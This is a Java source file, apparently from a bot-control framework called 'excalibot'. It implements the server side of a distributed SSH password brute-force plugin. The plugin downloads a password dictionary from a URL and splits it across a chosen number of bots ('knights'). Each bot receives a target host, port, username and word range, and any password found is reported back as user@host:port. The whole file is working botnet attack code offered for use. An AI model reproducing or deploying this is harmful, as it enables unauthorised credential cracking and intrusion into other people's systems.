package org.powertrip.excalibot.common.plugins.bruteforce;

import org.powertrip.excalibot.common.com.*;
import org.powertrip.excalibot.common.plugins.ArthurPlug;
import org.powertrip.excalibot.common.plugins.bruteforce.bruteforce.Bruteforce;
import org.powertrip.excalibot.common.plugins.interfaces.arthur.KnightManagerInterface;
import org.powertrip.excalibot.common.plugins.interfaces.arthur.TaskManagerInterface;
import org.powertrip.excalibot.common.utils.logging.Logger;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class Server extends ArthurPlug{
	public Server(KnightManagerInterface knightManager, TaskManagerInterface taskManager) {
		super(knightManager, taskManager);
	}

	@Override
	public PluginHelp help() {
		return new PluginHelp().setHelp("bruteforce host:<address> port:<port> user:<ssh username> dict:<url to dictionary> bots:<number of bots>");
	}

	@Override
	public TaskResult check(Task task) {
		TaskResult result = new TaskResult();
        Boolean complete = false;

		Long total = taskManager.getKnightCount(task.getTaskId());
		Long recev = taskManager.getResultCount(task.getTaskId());


        for(SubTaskResult st:  taskManager.getAllResults(task.getTaskId())) {
            if(st.getResponse("password") != null){
                complete = true;
            }
        }

		result
			.setSuccessful(true)
			.setTaskId(task.getTaskId())
			.setResponse("total", total.toString())
			.setResponse("done", recev.toString())
			.setComplete(total.equals(recev) || complete);
		return result;
	}

	@Override
	public TaskResult get(Task task) {
		Long total = taskManager.getKnightCount(task.getTaskId());
		Long recev = taskManager.getResultCount(task.getTaskId());

        TaskResult result = new TaskResult();
        result
            .setTaskId(task.getTaskId())
            .setSuccessful(true);

        String password = null;
        String host = null;
        String user = null;
        String port = null;

        for(SubTaskResult st:  taskManager.getAllResults(task.getTaskId())) {
            if(st.getResponse("password") != null){
                password = st.getResponse("password");
                host = st.getResponse("host");
                port = st.getResponse("port");
                user = st.getResponse("user");
            }
        }

        if(password != null && host != null && port != null && user != null){
            result
                .setComplete(true)
                .setResponse("stdout", "Password [" + password + "] found, for " + user + "@" + host + ":" + port);
        } else {
            if(total.equals(recev)) {
                result
                    .setComplete(true)
                    .setResponse("stdout", "The password could not be found");
            } else {
                result
                    .setComplete(false)
                    .setResponse("stdout", "Search not completed");
            }
        }
		return result;
	}

	@Override
	public void handleSubTaskResult(Task task, SubTaskResult subTaskResult) {
		/**
		 * Only if I need to do anything when I get a reply.
		 */
	}

	@Override
	public TaskResult submit(Task task) {
		//Get my parameter map, could use task.getParameter(String key), but this is shorter.
		Logger.log(task.toString());
		Map args = task.getParametersMap();

		//Declare my parameters
		long botCount;
        String host;
        String user;
        String port;
        String dict;

		//Create a TaskResult and fill the common fields.
		TaskResult result = new TaskResult()
									.setTaskId(task.getTaskId())
									.setSuccessful(false)
									.setComplete(true);

		//No Dice! Wrong parameters.
		if( !args.containsKey("host") || !args.containsKey("bots") || !args.containsKey("user") || !args.containsKey("dict")) {
			return result.setResponse("stdout", "Wrong parameters");
		}

		//Parse parameters
        host = (String) args.get("host");
        port = (String) args.get("port");
		botCount = Long.parseLong((String) args.get("bots"));
        user = (String) args.get("user");
        dict = (String) args.get("dict");

        //Get dictionary and size
        int size = 0;
        ArrayList<String> dictionary = Bruteforce.downloadDictionary(dict, null, null);
        if(dictionary != null) size = dictionary.size();
        if(dictionary == null || size == 0) return result.setResponse("stdout", "Invalid dictionary");

		try {
			//Get bots alive in the last 50 seconds and get as many as needed
			List<KnightInfo> bots = knightManager.getFreeKnightList(50000).subList(0, (int) botCount);
            int offset = 0;
            int slice = (int) (size/botCount);
			for(KnightInfo bot : bots){
				knightManager.dispatchToKnight(
						new SubTask(task, bot)
                                .setParameter("host", host)
                                .setParameter("user", user)
                                .setParameter("port", port)
                                .setParameter("dict", dict)
                                .setParameter("lowerBound", String.valueOf(offset))
                                .setParameter("higherBound", String.valueOf(offset+slice))
				);
                offset += slice;
			}
			result
				.setSuccessful(true)
				.setResponse("stdout", "Task accepted");
		}catch (IndexOutOfBoundsException e) {
			//No bots...
			result.setResponse("stdout", "Not enough free bots.");
		}
		return result;
	}
}
